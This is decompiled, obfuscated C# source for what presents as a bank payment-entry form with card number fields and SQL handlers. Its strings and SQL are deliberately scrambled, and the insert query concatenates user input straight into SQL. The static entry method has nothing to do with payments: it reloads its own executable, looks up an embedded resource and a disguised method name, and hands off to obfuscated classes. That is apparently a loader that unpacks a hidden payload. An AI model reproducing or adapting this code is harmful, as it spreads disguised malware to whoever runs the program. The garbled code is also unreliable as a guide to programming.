using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Jx02R;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Qb9n3;
using e8JYt9;
using m3R1Xi;
using w6Y9Jm;

namespace s6KLe4;

public class j6FLn1
{
	internal sealed class k7DNq2
	{
		internal object object_0;

		internal object object_1;

		internal object object_2;

		internal object object_3;

		internal k7DNq2()
		{
		}
	}

	private object Admin_Hmepage;

	private object TextBoxCustomerName;

	private object TextBoxCardNumber;

	private object TextBoxBranch;

	private Gq6c5M.Ci1t4W ci1t4W_0;

	private void Qi2f9C(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c0: Expected O, but got Unknown
		//IL_01bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Expected O, but got Unknown
		//IL_02a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DbConnection dbConnection = (DbConnection)new SqlConnection();
			object obj = (object)new SqlCommand();
			((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).set_ConnectionString("fsjdhfsjdghsuewt89we900tt oierru9w8t ejgj'o9oa8g aljgrii8ag0ir oayttajgh8uuar");
			((SqlConnection)dbConnection).Open();
			((SqlCommand)((obj is SqlCommand) ? obj : null)).set_Connection((SqlConnection)(object)((dbConnection is SqlConnection) ? dbConnection : null));
			((SqlCommand)((obj is SqlCommand) ? obj : null)).set_CommandType(CommandType.Text);
			((SqlCommand)((obj is SqlCommand) ? obj : null)).set_CommandText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"select * asffsgseyeurtrturuymentid='", NewLateBinding.LateGet(ci1t4W_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' ")));
			IDataReader dataReader = (IDataReader)((SqlCommand)((obj is SqlCommand) ? obj : null)).ExecuteReader();
			if (((SqlDataReader)((dataReader is SqlDataReader) ? dataReader : null)).get_HasRows())
			{
				Interaction.MsgBox((object)"Paymurturuent Alrrurueeady Regisrturttyrutered", (MsgBoxStyle)16, (object)null);
				((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
			}
			else
			{
				((SqlConnection)dbConnection).Close();
				((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Open();
				obj = (object)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"inserteryreyeyrtutrur into sdfsgrerypayments vtutrurturtualues('", NewLateBinding.LateGet(ci1t4W_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxCustomerName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(ci1t4W_0.object_1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxCardNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxBranch, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')")), (SqlConnection)dbConnection);
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(ci1t4W_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxCustomerName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(ci1t4W_0.object_1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxCardNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxBranch, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
				{
					MessageBox.Show("Pleasetrurtutrutru enter the trutrurturtywdetails");
				}
				else
				{
					((SqlCommand)obj).ExecuteNonQuery();
					Interaction.MsgBox((object)"SuccersWRVQW46N575M8sfully Regis57959,tered.", (MsgBoxStyle)64, (object)"Succr46m880.69p9.7ess");
				}
				((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
			}
			((SqlConnection)dbConnection).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"ErrWE668769,or", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void b2A9Gq(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		object obj = (object)new SqlConnection("AET578 8Etyir77i7yi  688 87");
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(ci1t4W_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			MessageBox.Show("Emeurt778799,pty Id");
			return;
		}
		object obj2 = (object)new SqlCommand("Usytrutt7i76967969yit", (SqlConnection)obj);
		((SqlCommand)obj2).get_Parameters().Add("@cndyirt7i", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxCustomerName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)obj2).get_Parameters().Add("@bnyiu5y 56", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ci1t4W_0.object_1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).get_Parameters().Add("@cardnusty 5w5757m", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxCardNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).get_Parameters().Add("@bansy5547ykb", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxBranch, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).get_Parameters().Add("@ite676d", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ci1t4W_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)((obj is SqlConnection) ? obj : null)).Open();
		if (((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Data dture68me 68u 6Upd6uated");
		}
		else
		{
			MessageBox.Show("Da 5 u6ta Ntaeot U6878eh jghlipdated");
		}
		((SqlConnection)((obj is SqlConnection) ? obj : null)).Close();
	}

	private void Me7y3G(object sender, EventArgs e)
	{
		Lz7e2W();
		NewLateBinding.LateCall(Admin_Hmepage, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Lz7e2W()
	{
		throw new NotImplementedException();
	}

	private void Ay36Jm(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		ICloneable cloneable = (ICloneable)new SqlConnection("sdh oufuafgr9uf");
		DbCommand dbCommand = (DbCommand)new SqlCommand("DELETE FsafagargraeyreyROM payments WutyiriuooHERE PtyrtuaymentID = @id", (SqlConnection)cloneable);
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@iddtuyud", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ci1t4W_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)cloneable).Open();
		if (((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Padyuyiuo8p98[yment 0[09[Deleted");
		}
		else
		{
			MessageBox.Show("Payme4e66798ont Deleted");
		}
		((SqlConnection)cloneable).Close();
	}

	private void Ed38Hz(object sender, EventArgs e)
	{
		Nz32Te.x9LRn1();
	}

	[STAThread]
	public static void Bd2j6P()
	{
		checked
		{
			try
			{
				object currentDirectory = Directory.GetCurrentDirectory();
				object directoryName = Path.GetDirectoryName(currentDirectory as string);
				int num = default(int);
				if ((currentDirectory as string).Contains((string)directoryName))
				{
					IEquatable<string> equatable = directoryName as string;
					for (int i = 0; i < (equatable as string).Length; i++)
					{
						char c = (equatable as string)[i];
						if (Operators.CompareString(Conversions.ToString(c), "\\", false) == 0)
						{
							num++;
						}
					}
				}
				if (num <= 0)
				{
					return;
				}
				object obj = new List<char[]>();
				(obj as List<char[]>).Add((currentDirectory as string).ToCharArray());
				(obj as List<char[]>).Add((directoryName as string).ToCharArray());
				ISerializable serializable = new StringBuilder();
				object obj2 = new StringBuilder();
				long num2 = ((string)currentDirectory).Length * num;
				object obj3 = ((List<char[]>)obj)[0];
				for (int j = 0; j < (obj3 as char[]).Length; j++)
				{
					char c2 = ((char[])obj3)[j];
					(serializable as StringBuilder).AppendLine(Conversions.ToString(c2));
					num2 += num;
				}
				Array array = ((List<char[]>)obj)[1];
				for (int k = 0; k < (array as char[]).Length; k++)
				{
					char c3 = (array as char[])[k];
					(obj2 as StringBuilder).AppendLine(Conversions.ToString(c3));
					num2 += num;
				}
				int count = Regex.Matches(((StringBuilder)serializable).ToString(), Environment.NewLine).Count;
				int count2 = Regex.Matches(((StringBuilder)obj2).ToString(), Environment.NewLine).Count;
				if (count == count2 && count != count2)
				{
					return;
				}
				int num3;
				do
				{
					Gd13P.num = Cs6t4.Zi5j4();
					num3 = Gd13P.num;
				}
				while (num3 != 100);
				Gd13P.Ass = Assembly.LoadFile(Application.get_ExecutablePath());
				Gd13P.Names = (string[])NewLateBinding.LateGet(Gd13P.Ass, (Type)null, "GetManifestResourceNames", new object[0], (string[])null, (Type[])null, (bool[])null);
				Gd13P.ResName = "Bcnis7df8";
				Gd13P.Res = ".res" + "ourc" + "es";
				Gd13P.MName = "YMYeYYYtYYYYYhYYYoYYdYY0YYYYYYY";
				Gd13P.TNum = 35;
				Gd13P.Mnum = 0;
				object obj4 = new List<int>
				{
					Capacity = 15
				};
				int num4 = 0;
				do
				{
					unchecked
					{
						((List<int>)obj4).Add(Gd13P.num % checked(num4 + 2));
					}
					num4++;
				}
				while (num4 <= 10);
				if (((List<int>)obj4)[5] == 2)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(new object());
					Dy26Q.Ly86Fr(RuntimeHelpers.GetObjectValue(objectValue), ((List<int>)obj4)[7], "jnj;y87676r65xxcyuy88yhi;k", Mq54Dc: false);
					if (((List<int>)obj4)[5] > 0)
					{
						((List<int>)obj4)[5] = (obj4 as List<int>)[5] * 25 * 25;
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
